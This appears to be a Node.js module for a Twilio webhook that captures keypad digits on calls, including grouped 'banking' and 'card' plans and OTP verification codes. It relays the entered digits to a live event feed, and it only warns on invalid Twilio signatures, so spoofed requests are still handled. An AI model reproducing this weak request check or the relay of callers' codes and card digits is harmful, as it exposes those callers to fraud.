'use strict';

function createTwilioGatherHandler(deps = {}) {
  const {
    warnOnInvalidTwilioSignature = () => {},
    getDigitService,
    digitService: staticDigitService,
    callConfigurations,
    config,
    VoiceResponse,
    webhookService,
    resolveHost,
    buildTwilioStreamTwiml,
    clearPendingDigitReprompts,
    callEndLocks,
    gatherEventDedupe,
    maskDigitsForLog = (input) => String(input || ''),
    callEndMessages = {},
    closingMessage = 'Thank you for your time. Goodbye.',
    queuePendingDigitAction,
    getTwilioTtsAudioUrl,
    shouldUseTwilioPlay,
    resolveTwilioSayVoice,
    isGroupedGatherPlan
  } = deps;

  const getService = () => (typeof getDigitService === 'function' ? getDigitService() : staticDigitService);

  return async function twilioGatherHandler(req, res) {
    try {
      warnOnInvalidTwilioSignature(req, '/webhook/twilio-gather');
      const digitService = getService();
      const { CallSid, Digits } = req.body || {};
      const callSid = req.query?.callSid || CallSid;
      if (!callSid) {
        return res.status(400).send('Missing CallSid');
      }
      console.log(`Gather webhook hit: callSid=${callSid} digits=${maskDigitsForLog(Digits || '')}`);

      let expectation = digitService?.getExpectation?.(callSid);
      if (!expectation && digitService?.getLockedGroup && digitService?.requestDigitCollectionPlan) {
        const callConfig = callConfigurations.get(callSid) || {};
        const groupId = digitService.getLockedGroup(callConfig);
        if (groupId) {
          await digitService.requestDigitCollectionPlan(callSid, {
            group_id: groupId,
            steps: [],
            end_call_on_success: true,
            capture_mode: 'ivr_gather',
            defer_twiml: true
          });
          expectation = digitService.getExpectation(callSid);
        }
      }
      if (!expectation) {
        console.warn(`Gather webhook had no expectation for ${callSid}`);
        const response = new VoiceResponse();
        response.say('We could not start digit capture. Goodbye.');
        response.hangup();
        res.type('text/xml');
        res.end(response.toString());
        return;
      }

      const host = resolveHost(req);
      const callConfig = callConfigurations.get(callSid) || {};
      const sayVoice = resolveTwilioSayVoice ? resolveTwilioSayVoice(callConfig) : null;
      const sayOptions = sayVoice ? { voice: sayVoice } : null;
      const playbackPlan = digitService?.getPlan ? digitService.getPlan(callSid) : null;
      const isGroupedPlayback = typeof isGroupedGatherPlan === 'function'
        ? isGroupedGatherPlan(playbackPlan, callConfig)
        : Boolean(playbackPlan && ['banking', 'card'].includes(playbackPlan.group_id));
      const usePlayForGrouped = Boolean(
        isGroupedPlayback && typeof shouldUseTwilioPlay === 'function' && shouldUseTwilioPlay(callConfig)
      );
      const respondWithGather = async (exp, promptText = '', followupText = '') => {
        try {
          const promptUrl = usePlayForGrouped && getTwilioTtsAudioUrl
            ? await getTwilioTtsAudioUrl(promptText, callConfig, { cacheOnly: true })
            : null;
          const followupUrl = usePlayForGrouped && getTwilioTtsAudioUrl
            ? await getTwilioTtsAudioUrl(followupText, callConfig, { cacheOnly: true })
            : null;
          const twiml = digitService.buildTwilioGatherTwiml(
            callSid,
            exp,
            { prompt: promptText, followup: followupText, promptUrl, followupUrl, sayOptions },
            host
          );
          res.type('text/xml');
          res.end(twiml);
          return true;
        } catch (err) {
          console.error('Twilio gather build error:', err);
          return false;
        }
      };
      const respondWithStream = () => {
        const twiml = buildTwilioStreamTwiml(host);
        res.type('text/xml');
        res.end(twiml);
      };
      const respondWithHangup = async (message) => {
        if (callEndLocks?.has(callSid)) {
          respondWithStream();
          return;
        }
        callEndLocks?.set(callSid, true);
        const response = new VoiceResponse();
        if (message) {
          if (usePlayForGrouped && getTwilioTtsAudioUrl) {
            const url = await getTwilioTtsAudioUrl(message, callConfig, { cacheOnly: true });
            if (url) {
              response.play(url);
            } else if (sayOptions) {
              response.say(sayOptions, message);
            } else {
              response.say(message);
            }
          } else if (sayOptions) {
            response.say(sayOptions, message);
          } else {
            response.say(message);
          }
        }
        response.hangup();
        res.type('text/xml');
        res.end(response.toString());
      };

      digitService?.clearDigitTimeout?.(callSid);

      const digits = String(Digits || '').trim();
      const dedupeKey = digits ? `${callSid}:${digits}` : null;
      if (dedupeKey) {
        const lastSeen = gatherEventDedupe?.get(dedupeKey);
        if (lastSeen && Date.now() - lastSeen < 2000) {
          console.warn(`Duplicate gather webhook ignored for ${callSid}`);
          const currentExpectation = digitService?.getExpectation?.(callSid);
          if (currentExpectation) {
            const prompt = currentExpectation.prompt || digitService.buildDigitPrompt(currentExpectation);
            if (await respondWithGather(currentExpectation, prompt)) {
              return;
            }
          }
          respondWithStream();
          return;
        }
        gatherEventDedupe?.set(dedupeKey, Date.now());
      }
      if (digits) {
        const expectation = digitService.getExpectation(callSid);
        const plan = digitService?.getPlan ? digitService.getPlan(callSid) : null;
        const hadPlan = !!expectation?.plan_id;
        const planEndOnSuccess = plan ? plan.end_call_on_success !== false : true;
        const planCompletionMessage = plan?.completion_message || '';
        const isGroupedPlan = typeof isGroupedGatherPlan === 'function'
          ? isGroupedGatherPlan(plan, callConfig)
          : Boolean(plan && ['banking', 'card'].includes(plan.group_id));
        const shouldEndOnSuccess = expectation?.end_call_on_success !== false;
        const display = expectation?.profile === 'verification'
          ? digitService.formatOtpForDisplay(digits, 'progress', expectation?.max_digits)
          : `Keypad (Gather): ${digits}`;
        webhookService?.addLiveEvent?.(callSid, `🔢 ${display}`, { force: true });
        const collection = digitService.recordDigits(callSid, digits, { timestamp: Date.now(), source: 'gather' });
        await digitService.handleCollectionResult(callSid, collection, null, 0, 'gather', { allowCallEnd: true, deferCallEnd: true });

        if (collection.accepted) {
          const nextExpectation = digitService.getExpectation(callSid);
          if (nextExpectation?.plan_id) {
            const stepPrompt = digitService.buildPlanStepPrompt
              ? digitService.buildPlanStepPrompt(nextExpectation)
              : (nextExpectation.prompt || digitService.buildDigitPrompt(nextExpectation));
            const nextPrompt = isGroupedPlan ? `Thanks. ${stepPrompt}` : stepPrompt;
            clearPendingDigitReprompts?.(callSid);
            digitService.clearDigitTimeout(callSid);
            digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: nextPrompt });
            if (await respondWithGather(nextExpectation, nextPrompt)) {
              return;
            }
          } else if (hadPlan) {
            clearPendingDigitReprompts?.(callSid);
            const profile = expectation?.profile || collection.profile;
            const completionMessage = planCompletionMessage
              || (digitService?.buildClosingMessage ? digitService.buildClosingMessage(profile) : closingMessage);
            if (planEndOnSuccess) {
              await respondWithHangup(completionMessage);
              return;
            }
          } else if (shouldEndOnSuccess) {
            clearPendingDigitReprompts?.(callSid);
            const profile = expectation?.profile || collection.profile;
            const completionMessage = digitService?.buildClosingMessage
              ? digitService.buildClosingMessage(profile)
              : closingMessage;
            await respondWithHangup(completionMessage);
            return;
          }

          queuePendingDigitAction?.(callSid, {
            type: 'reprompt',
            text: 'Thanks. One moment please.',
            scheduleTimeout: false
          });
          respondWithStream();
          return;
        }

        if (collection.fallback) {
          const failureMessage = expectation?.failure_message || callEndMessages.failure;
          clearPendingDigitReprompts?.(callSid);
          await respondWithHangup(failureMessage);
          return;
        }

        const attemptCount = collection.attempt_count || expectation?.attempt_count || collection.retries || 1;
        let reprompt = digitService?.buildAdaptiveReprompt
          ? digitService.buildAdaptiveReprompt(expectation || {}, collection.reason, attemptCount)
          : '';
        if (!reprompt) {
          reprompt = expectation ? digitService.buildDigitPrompt(expectation) : 'Please enter the digits again.';
        }
        clearPendingDigitReprompts?.(callSid);
        digitService.clearDigitTimeout(callSid);
        digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: reprompt });
        if (await respondWithGather(expectation, reprompt)) {
          return;
        }
        respondWithStream();
        return;
      }

      const plan = digitService?.getPlan ? digitService.getPlan(callSid) : null;
      const isGroupedPlan = typeof isGroupedGatherPlan === 'function'
        ? isGroupedGatherPlan(plan, callConfig)
        : Boolean(plan && ['banking', 'card'].includes(plan.group_id));
      if (isGroupedPlan) {
        const timeoutMessage = expectation.timeout_failure_message || callEndMessages.no_response;
        clearPendingDigitReprompts?.(callSid);
        digitService.clearDigitFallbackState(callSid);
        digitService.clearDigitPlan(callSid);
        if (digitService?.updatePlanState) {
          digitService.updatePlanState(callSid, plan, 'FAIL', { step_index: expectation?.plan_step_index, reason: 'timeout' });
        }
        callConfig.digit_capture_active = false;
        if (callConfig.call_mode === 'dtmf_capture') {
          callConfig.call_mode = 'normal';
        }
        callConfigurations.set(callSid, callConfig);
        await respondWithHangup(timeoutMessage);
        return;
      }

      expectation.retries = (expectation.retries || 0) + 1;
      digitService.expectations.set(callSid, expectation);

      if (expectation.retries > expectation.max_retries) {
        const timeoutMessage = expectation.timeout_failure_message || callEndMessages.no_response;
        clearPendingDigitReprompts?.(callSid);
        digitService.clearDigitFallbackState(callSid);
        digitService.clearDigitPlan(callSid);
        await respondWithHangup(timeoutMessage);
        return;
      }

      const timeoutPrompt = digitService?.buildTimeoutPrompt
        ? digitService.buildTimeoutPrompt(expectation, expectation.retries || 1)
        : (expectation.reprompt_timeout
          || expectation.reprompt_message
          || 'I did not receive any input. Please enter the code using your keypad.');
      clearPendingDigitReprompts?.(callSid);
      digitService.clearDigitTimeout(callSid);
      digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: timeoutPrompt });
      if (await respondWithGather(expectation, timeoutPrompt)) {
        return;
      }
      respondWithStream();
    } catch (error) {
      console.error('Twilio gather webhook error:', error);
      res.status(500).send('Error');
    }
  };
}

module.exports = { createTwilioGatherHandler };
